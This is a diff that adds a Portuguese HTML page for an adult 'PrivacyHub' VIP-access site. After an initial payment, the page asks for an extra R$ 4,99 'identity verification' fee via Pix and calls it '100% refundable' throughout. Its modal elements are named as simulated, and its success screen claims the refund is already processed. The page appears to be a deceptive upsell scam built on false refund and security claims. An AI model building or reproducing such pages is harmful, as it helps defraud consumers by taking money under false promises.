@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Verificação de Identidade - PrivacyHub</title>
+  <link rel="stylesheet" href="verificacao.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+</head>
+<body>
+
+  <!-- Topo de Segurança -->
+  <header class="verif-header">
+    <div class="container header-content">
+      <div class="logo">
+        PRIVACY<span class="badge">HUB</span>
+      </div>
+      <div class="security-badge-top">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+        </svg>
+        <span>Ambiente 100% Criptografado</span>
+      </div>
+    </div>
+  </header>
+
+  <main class="container main-wrapper">
+
+    <!-- Indicador de Progresso Visual (Etapas) -->
+    <div class="progress-container">
+      <div class="progress-step completed">
+        <div class="step-circle">✓</div>
+        <span class="step-label">1. Pagamento inicial</span>
+      </div>
+      <div class="progress-line active"></div>
+      <div class="progress-step active">
+        <div class="step-circle">2</div>
+        <span class="step-label">2. Verificação de identidade <small class="current-badge">← Etapa atual</small></span>
+      </div>
+      <div class="progress-line"></div>
+      <div class="progress-step pending">
+        <div class="step-circle">3</div>
+        <span class="step-label">3. Acesso liberado</span>
+      </div>
+    </div>
+
+    <!-- Título Principal & Subtítulo -->
+    <div class="headline-section">
+      <h1 class="main-title">🔐 VERIFICAÇÃO DE IDENTIDADE</h1>
+      <p class="subtitle">Confirme sua identidade para concluir a liberação do seu acesso.</p>
+    </div>
+
+    <!-- Container Central de Verificação -->
+    <div class="verification-card">
+      
+      <!-- Destaque de Reembolso 100% -->
+      <div class="reimbursement-banner">
+        <div class="refund-icon">💰</div>
+        <div>
+          <span class="refund-title">VALOR 100% REEMBOLSÁVEL</span>
+          <p class="refund-desc">Após a confirmação da identidade, o valor de <strong>R$ 4,99 será devolvido</strong>, conforme o prazo e o método de reembolso efetivamente utilizados pela plataforma.</p>
+        </div>
+      </div>
+
+      <!-- Texto Explicativo -->
+      <p class="explanatory-text">
+        Para manter a segurança da plataforma e confirmar a identidade do titular do acesso, é necessário concluir uma etapa de verificação.
+        Para iniciar o procedimento, será realizada uma cobrança temporária de:
+      </p>
+
+      <!-- Preço e Selo Reembolsável -->
+      <div class="price-display-wrapper">
+        <div class="price-box">
+          <span class="currency">R$</span>
+          <span class="big-price">4,99</span>
+        </div>
+        <div class="reimbursable-tag">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <polyline points="20 6 9 17 4 12"></polyline>
+          </svg>
+          100% REEMBOLSÁVEL
+        </div>
+      </div>
+
+      <!-- Aviso Importante (Não é imposto) -->
+      <div class="disclaimer-alert">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="alert-icon">
+          <circle cx="12" cy="12" r="10"></circle>
+          <line x1="12" y1="8" x2="12" y2="12"></line>
+          <line x1="12" y1="16" x2="12.01" y2="16"></line>
+        </svg>
+        <p>Esta cobrança não é um imposto ou tributo. O valor de R$ 4,99 está relacionado ao procedimento de verificação e será reembolsado após a confirmação da identidade, de acordo com as condições informadas nesta página.</p>
+      </div>
+
+      <!-- Card Principal de Recursos -->
+      <div class="features-check-card">
+        <h3>Verificação de Identidade</h3>
+        <p class="card-subtitle">Valor temporário: <strong>R$ 4,99</strong></p>
+
+        <ul class="features-list">
+          <li>
+            <span class="check-icon">✓</span>
+            <span>Pagamento seguro</span>
+          </li>
+          <li>
+            <span class="check-icon">✓</span>
+            <span>Etapa de verificação</span>
+          </li>
+          <li>
+            <span class="check-icon">✓</span>
+            <span>Valor reembolsável após a confirmação</span>
+          </li>
+          <li>
+            <span class="check-icon">✓</span>
+            <span>Liberação do acesso após a conclusão do processo</span>
+          </li>
+        </ul>
+      </div>
+
+      <!-- Botão Principal de Ação -->
+      <div class="action-wrapper">
+        <button id="btnVerify" onclick="processOmegaPayPix(4.99, 'Verificação de Identidade (+18)', 'acesso-liberado.html')" class="btn-verify-main">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          VERIFICAR IDENTIDADE — R$ 4,99
+        </button>
+        <p class="under-button-note">🔒 O valor é reembolsável após a confirmação da identidade.</p>
+      </div>
+
+      <!-- Painel de Status do Sistema (Fluxo de Verificação Real) -->
+      <div id="statusTrackerCard" class="status-tracker-card">
+        <div class="tracker-header">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
+            <polyline points="22 4 12 14.01 9 11.01"></polyline>
+          </svg>
+          <span>Painel de Registro de Verificação & Reembolso</span>
+        </div>
+
+        <div class="tracker-steps">
+          <div id="statusItemPayment" class="status-item current">
+            <span class="status-dot"></span>
+            <div>
+              <strong>1. Pagamento da Taxa Temporária (R$ 4,99)</strong>
+              <span id="statusLabelPayment" class="status-state">Aguardando pagamento...</span>
+            </div>
+          </div>
+
+          <div id="statusItemVerification" class="status-item pending">
+            <span class="status-dot"></span>
+            <div>
+              <strong>2. Análise de Identidade</strong>
+              <span id="statusLabelVerification" class="status-state">Aguardando confirmação do pagamento...</span>
+            </div>
+          </div>
+
+          <div id="statusItemRefund" class="status-item pending">
+            <span class="status-dot"></span>
+            <div>
+              <strong>3. Processamento de Reembolso (R$ 4,99)</strong>
+              <span id="statusLabelRefund" class="status-state">Pendente de verificação...</span>
+            </div>
+          </div>
+
+          <div id="statusItemAccess" class="status-item pending">
+            <span class="status-dot"></span>
+            <div>
+              <strong>4. Liberação do Acesso VIP</strong>
+              <span id="statusLabelAccess" class="status-state">Bloqueado</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Modal Interativo de Verificação / Checkout Real -->
+    <div id="verificationModal" class="modal-backdrop" style="display: none;">
+      <div class="modal-content">
+        <button id="modalClose" class="modal-close">&times;</button>
+        <div class="modal-icon-header">
+          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#ff0055" stroke-width="2">
+            <rect x="3" y="4" width="18" height="16" rx="2"></rect>
+            <circle cx="9" cy="10" r="2"></circle>
+            <line x1="15" y1="8" x2="17" y2="8"></line>
+            <line x1="15" y1="12" x2="17" y2="12"></line>
+            <line x1="7" y1="16" x2="17" y2="16"></line>
+          </svg>
+        </div>
+        <h2>Procedimento de Verificação de Identidade</h2>
+        <p>Efetue a confirmação da taxa temporária de <strong>R$ 4,99 (100% Reembolsável)</strong> para validar sua identidade.</p>
+        
+        <div id="modalStep1" class="modal-body-step">
+          <div class="pix-simulated-box">
+            <p class="pix-title">⚡ Pagamento Pix Seguro (R$ 4,99)</p>
+            <p class="pix-sub">O valor será estornado automaticamente após a confirmação.</p>
+            <button id="btnConfirmPaymentSim" class="btn-confirm-sim">
+              CONFIRMAR PAGAMENTO DE R$ 4,99 & INICIAR ANÁLISE
+            </button>
+          </div>
+        </div>
+
+        <div id="modalStepProcessing" class="modal-body-step" style="display: none;">
+          <div class="spinner"></div>
+          <h3 id="procStepTitle">Validando dados de identidade...</h3>
+          <p id="procStepDesc">Aguarde enquanto nosso sistema confirma o titular do acesso.</p>
+        </div>
+
+        <div id="modalStepSuccess" class="modal-body-step" style="display: none;">
+          <div class="success-icon">✓</div>
+          <h3>IDENTIDADE VERIFICADA COM SUCESSO!</h3>
+          <p>Seu reembolso de <strong>R$ 4,99</strong> foi processado e seu acesso VIP foi liberado.</p>
+          <button id="btnGoToContent" class="btn-confirm-sim btn-success">
+            ACESSAR CONTEÚDO LIBERADO AGORA →
+          </button>
+        </div>
+      </div>
+    </div>
+
+  </main>
+
+  <footer class="verif-footer">
+    <p>🔒 Sistema de Verificação Segura PrivacyHub &copy; 2026. Todos os direitos reservados.</p>
+    <p class="footer-sub">Cobrança de verificação 100% reembolsável. Não constitui taxa governamental ou tributo.</p>
+  </footer>
+
+  <script src="omegapay-integration.js"></script>
+  <script src="verificacao.js"></script>
+</body>
+</html>
